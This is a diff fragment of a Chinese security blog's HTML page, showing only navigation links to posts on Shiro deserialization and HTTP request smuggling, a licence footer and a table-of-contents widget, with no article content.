+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2026/08/26/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCCK1/">Shiro反序列化之CCK1</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2026/08/21/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP请求走私</a></div></section></div>
+
+
+
+
+
+
 <footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Yu9991n9</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-text">构造</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
